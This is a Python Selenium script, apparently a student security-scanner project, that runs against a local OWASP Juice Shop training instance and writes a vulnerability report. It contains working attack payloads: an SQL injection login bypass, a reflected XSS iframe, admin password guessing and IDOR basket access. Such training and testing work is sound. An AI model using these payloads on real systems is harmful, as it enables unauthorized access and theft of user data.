import time
import json
import urllib.parse
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import UnexpectedAlertPresentException, NoAlertPresentException, TimeoutException

# ==========================================
# CONFIGURATION
# ==========================================
TARGET_URL = "http://localhost:3000"
ADMIN_EMAIL = "admin@juice-sh.op"


class WebScanPro:
    def __init__(self):
        print("[*] Initializing WebScanPro (Weeks 1-7)...")
        options = webdriver.ChromeOptions()
        options.add_argument("--ignore-certificate-errors")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")

        self.driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        self.driver.maximize_window()
        self.wait = WebDriverWait(self.driver, 5)

        # Data Storage
        self.scan_start_time = time.strftime("%Y-%m-%d %H:%M:%S")
        self.crawl_data = {
            "target": TARGET_URL,
            "scan_date": self.scan_start_time,
            "endpoints_found": []
        }
        self.vulnerabilities = []

    def start_scan(self):
        print(f"[*] Target locked: {TARGET_URL}")
        self.driver.get(TARGET_URL)
        time.sleep(3)
        self.nuke_popups()

        # --- EXECUTE MODULES ---
        self.module_crawler()  # Week 2
        self.module_sqli()  # Week 3
        self.module_xss()  # Week 4
        self.module_auth_session()  # Week 5
        self.module_idor()  # Week 6
        self.generate_reports() # Week 7

        print("\n[*] SCAN COMPLETE. Closing browser in 5 seconds...")
        time.sleep(5)
        self.driver.quit()

    def nuke_popups(self):
        """Helper: Removes annoying overlays"""
        try:
            self.driver.execute_script("""
                document.getElementsByClassName('cc-window')[0]?.remove();
                document.getElementsByTagName('app-welcome-banner')[0]?.remove();
                document.getElementsByClassName('cdk-overlay-backdrop')[0]?.remove();
            """)
        except:
            pass

    # =====================================================
    # MODULES 1-6 (Logic from previous weeks)
    # =====================================================
    def module_crawler(self):
        print("\n=== MODULE 1: CRAWLER ===")
        known_routes = [
            {"name": "Home", "url": f"{TARGET_URL}/#/"},
            {"name": "Login", "url": f"{TARGET_URL}/#/login"},
            {"name": "Basket API", "url": f"{TARGET_URL}/rest/basket/"}
        ]
        for route in known_routes:
            self.crawl_data["endpoints_found"].append(route)
            print(f" [+] Endpoint found: {route['url']}")

    def module_sqli(self):
        print("\n=== MODULE 2: SQL INJECTION ===")
        try:
            self.driver.get(f"{TARGET_URL}/#/login")
            time.sleep(1)
            self.nuke_popups()

            # Login Bypass Payload
            email = self.wait.until(EC.visibility_of_element_located((By.ID, "email")))
            self.driver.find_element(By.ID, "password").send_keys("junk")
            email.send_keys("' OR 1=1 --")
            self.driver.find_element(By.ID, "loginButton").click()
            time.sleep(2)

            if "login" not in self.driver.current_url:
                print(f"[!!!] SUCCESS: Admin Login Bypass")
                self.add_vuln("SQL Injection", "Critical", "/#/login",
                              "Auth bypass via SQLi in email field.",
                              "Use parameterized queries (Prepared Statements).")
                self.driver.get(f"{TARGET_URL}/#/logout")
        except Exception as e:
            print(f"[-] SQLi Error: {e}")

    def module_xss(self):
        print("\n=== MODULE 3: REFLECTED XSS ===")
        payload = '<iframe src="javascript:alert(`XSS`)">'
        try:
            hack_url = f"{TARGET_URL}/#/search?q={urllib.parse.quote(payload)}"
            self.driver.get(hack_url)
            time.sleep(2)
            if self.check_alert():
                print(f"[!!!] SUCCESS: XSS Alert Detected")
                self.add_vuln("Reflected XSS", "High", "/#/search",
                              "Arbitrary JS execution via search parameter.",
                              "Sanitize user input and implement Content Security Policy (CSP).")
        except:
            pass

    def check_alert(self):
        try:
            self.driver.switch_to.alert.accept()
            return True
        except:
            return False

    def module_auth_session(self):
        print("\n=== MODULE 4: AUTH & SESSION ===")
        # Brute Force
        passwords = ["admin123"]
        self.driver.get(f"{TARGET_URL}/#/login")
        time.sleep(1)
        self.nuke_popups()

        for pwd in passwords:
            try:
                self.wait.until(EC.visibility_of_element_located((By.ID, "email"))).send_keys(ADMIN_EMAIL)
                self.driver.find_element(By.ID, "password").send_keys(pwd)
                self.driver.find_element(By.ID, "loginButton").click()
                time.sleep(2)
                if "login" not in self.driver.current_url:
                    print(f"[!!!] SUCCESS: Weak Password Found: {pwd}")
                    self.add_vuln("Weak Credentials", "High", "/#/login",
                                  f"Admin password cracked: {pwd}",
                                  "Enforce strong password complexity policies.")
                    break
            except:
                pass

    def module_idor(self):
        print("\n=== MODULE 5: IDOR (Week 6) ===")
        # Must be logged in from Module 4
        target_ids = [1, 2]
        for basket_id in target_ids:
            self.driver.get(f"{TARGET_URL}/rest/basket/{basket_id}")
            time.sleep(1)
            content = self.driver.find_element(By.TAG_NAME, "body").text
            if '"data":' in content and '"products":' in content:
                print(f"[!!!] SUCCESS: Accessed Basket {basket_id}")
                self.add_vuln("IDOR", "High", f"/rest/basket/{basket_id}",
                              f"Unauthorized access to Basket {basket_id}.",
                              "Implement server-side access control checks.")

    def add_vuln(self, v_type, severity, location, desc, mitigation):
        self.vulnerabilities.append({
            "type": v_type,
            "severity": severity,
            "location": location,
            "description": desc,
            "mitigation": mitigation
        })

    # =====================================================
    # MODULE 7: REPORTING (New for Week 7)
    # =====================================================
    def generate_reports(self):
        print("\n=== MODULE 7: GENERATING SECURITY REPORT ===")

        # 1. JSON Report (Raw Data)
        with open("vulnerability_report.json", "w") as f:
            json.dump(self.vulnerabilities, f, indent=4)
        print("[+] JSON data saved.")

        # 2. HTML Report (Professional View)
        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>WebScanPro Security Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 40px; background-color: #f4f4f4; }}
                .container {{ background-color: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
                h1 {{ color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }}
                .summary {{ background-color: #ecf0f1; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
                table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
                th, td {{ padding: 12px; border: 1px solid #ddd; text-align: left; }}
                th {{ background-color: #34495e; color: white; }}
                tr:nth-child(even) {{ background-color: #f9f9f9; }}
                .Critical {{ color: #c0392b; font-weight: bold; }}
                .High {{ color: #e67e22; font-weight: bold; }}
                .Medium {{ color: #f1c40f; font-weight: bold; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>WebScanPro Vulnerability Report</h1>
                <div class="summary">
                    <p><strong>Target:</strong> {TARGET_URL}</p>
                    <p><strong>Scan Date:</strong> {self.scan_start_time}</p>
                    <p><strong>Total Vulnerabilities Found:</strong> {len(self.vulnerabilities)}</p>
                </div>

                <h2>Detailed Findings</h2>
                <table>
                    <thead>
                        <tr>
                            <th>Type</th>
                            <th>Severity</th>
                            <th>Location</th>
                            <th>Description</th>
                            <th>Suggested Mitigation</th>
                        </tr>
                    </thead>
                    <tbody>
        """

        for vuln in self.vulnerabilities:
            html_content += f"""
                        <tr>
                            <td>{vuln['type']}</td>
                            <td class="{vuln['severity']}">{vuln['severity']}</td>
                            <td>{vuln['location']}</td>
                            <td>{vuln['description']}</td>
                            <td>{vuln['mitigation']}</td>
                        </tr>
            """

        html_content += """
                    </tbody>
                </table>
            </div>
        </body>
        </html>
        """

        with open("security_report.html", "w") as f:
            f.write(html_content)

        print(f"[+] HTML Report generated: {os.path.abspath('security_report.html')}")


if __name__ == "__main__":
    scanner = WebScanPro()
    scanner.start_scan()